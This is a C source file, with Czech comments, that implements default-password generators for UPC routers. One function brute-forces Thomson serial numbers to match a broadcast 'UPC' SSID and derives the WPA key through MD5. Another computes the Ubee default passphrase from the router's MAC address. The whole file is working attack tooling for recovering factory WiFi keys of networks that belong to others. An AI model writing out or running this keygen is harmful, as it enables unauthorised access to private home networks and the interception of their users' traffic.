#include "passgen.h"
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <openssl/md5.h>

static void macstr_to_bytes(const char *mac_str, unsigned char *bytes) {
    int i = 0, j = 0;
    while(i < 12 && j < 6){
        int hi = toupper(mac_str[i]) < 'A' ? mac_str[i] - '0' : toupper(mac_str[i]) - 'A' + 10;
        int lo = toupper(mac_str[i+1]) < 'A' ? mac_str[i+1] - '0' : toupper(mac_str[i+1]) - 'A' + 10;
        bytes[j++] = hi * 16 + lo;
        i += 2;
        if (mac_str[i] == ':' || mac_str[i] == '-') i++;
    }
}

static const char* thomson_prefixes[] = {"SAAP", "SAPP", "UAAP", "SBAP"};
#define nprefixes (sizeof(thomson_prefixes)/sizeof(thomson_prefixes[0]))

// Pomocná funkce: preved na heslo z 8 znaků
static void thomson_hash2pass(uint8_t *h2, char *pass) {
    for(int i = 0; i < 8; ++i) {
        uint32_t a = h2[i] & 0x1f;
        a -= ((a * 0xb21642c9ULL) >> 36) * 23;
        a = (a & 0xff) + 0x41;
        if (a >= 'I') a++;
        if (a >= 'L') a++;
        if (a >= 'O') a++;
        pass[i] = (char)a;
    }
    pass[8] = '\0';
}

// Pomocná funkce: "mangle"
static uint32_t thomson_mangle(uint32_t *hv) {
    uint32_t a, b;
    a = ((hv[3] * 0x68de3afULL) >> 40) - (hv[3] >> 31);
    b = (hv[3] - a * 9999 + 1) * 11ULL;
    return b * (hv[1] * 100 + hv[2] * 10 + hv[0]);
}

// Generování SSID podle čtyř param. + magického čísla
static uint32_t thomson_upc_generate_ssid(uint32_t *p, uint32_t magic) {
    uint32_t a = p[1] * 10 + p[2];
    uint32_t b = p[0] * 2500000 + a * 6800 + p[3] + magic;
    return b - (((b * 0x6b5fca6bULL) >> 54) - (b >> 31)) * 10000000;
}

// Skutečný keygen
// ssid: řetězec "UPC1234567", pass: výstup (min. 9 bajtů)
void upc07keygen(const char *ssid, char *pass) {
    // Vytažení sedmičky
    if (strncmp(ssid, "UPC", 3) || strlen(ssid)!=10) {
        snprintf(pass, 9, "UPC-FAIL");
        return;
    }
    uint32_t target = (uint32_t)atoi(ssid+3);
    int found = 0;

    MD5_CTX ctx;
    for (uint32_t buf0=0; buf0<=9 && !found; ++buf0)
    for (uint32_t buf1=0; buf1<=99 && !found; ++buf1)
    for (uint32_t buf2=0; buf2<=9 && !found; ++buf2)
    for (uint32_t buf3=0; buf3<=9999 && !found; ++buf3)
    {
        uint32_t tuple[4] = {buf0, buf1, buf2, buf3};
        int mode=0;
        if (thomson_upc_generate_ssid(tuple, 0xff8d8f20) == target) mode=1;
        if (thomson_upc_generate_ssid(tuple, 0xffd9da60) == target) mode=2;
        if (!mode) continue;

        // Každá čtyřice, každý prefix
        for (int i=0; i<nprefixes && !found; ++i) {
            char serial[32], serialinput[32], tmpstr[17];
            uint8_t h1[16], h2[16];
            uint32_t hv[4], w1, w2;

            sprintf(serial, "%s%d%02d%d%04d", thomson_prefixes[i], buf0, buf1, buf2, buf3);
            memset(serialinput, 0, sizeof(serialinput));
            if (mode==2) { // reverse
                int llen = (int)strlen(serial);
                for(int j=0; j<llen; ++j) serialinput[llen-1-j] = serial[j];
            } else {
                memcpy(serialinput, serial, strlen(serial));
            }
            // 1. MD5 z serialinput
            MD5_Init(&ctx); MD5_Update(&ctx, serialinput, strlen(serialinput)); MD5_Final(h1, &ctx);
            // 2. dvě čtyřky z prvních a druhých slov
            for(int k=0; k<4; ++k) hv[k] = (uint16_t)(h1[2*k] | (h1[2*k+1]<<8));
            w1 = thomson_mangle(hv);
            for(int k=0; k<4; ++k) hv[k] = (uint16_t)(h1[8+2*k] | (h1[8+2*k+1]<<8));
            w2 = thomson_mangle(hv);
            // 3. do MD5
            sprintf(tmpstr, "%08X%08X", w1, w2);
            MD5_Init(&ctx); MD5_Update(&ctx, tmpstr, strlen(tmpstr)); MD5_Final(h2, &ctx);
            // 4. Výsledek
            thomson_hash2pass(h2, pass);
            found = 1;
            break;
        }
    }
    if (!found) snprintf(pass, 9, "UPC-FAIL");
}

void upc07ubee_generate_pass(const char *mac_str, char *pass) {
    unsigned char mac[6];
    macstr_to_bytes(mac_str, mac);
    MD5_CTX ctx;
    unsigned char buff1[100] = {0};
    unsigned char buff2[100] = {0};
    unsigned char buff3[100] = {0};
    unsigned char hash_buff[100] = {0};
    sprintf((char*)buff1, "%02X%02X%02X%02X%02X%02X555043444541554C5450415353504852415345",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    MD5_Init(&ctx);
    MD5_Update(&ctx, buff1, strlen((char*)buff1)+1);
    MD5_Final(buff2, &ctx);
    sprintf((char*)buff3, "%.02X%.02X%.02X%.02X%.02X%.02X", buff2[0]&0xf, buff2[1]&0xf, buff2[2]&0xf, buff2[3]&0xf, buff2[4]&0xf, buff2[5]&0xf);
    MD5_Init(&ctx);
    MD5_Update(&ctx, buff3, strlen((char*)buff3)+1);
    MD5_Final(hash_buff, &ctx);
    for (int i = 0; i < 8; ++i)
        pass[i] = 0x41u + ((hash_buff[i] + hash_buff[i+8]) % 0x1Au);
    pass[8] = '\0';
}

void upc07keygen_demo(const char *ssid, char *pass) {
    upc07keygen(ssid, pass);
}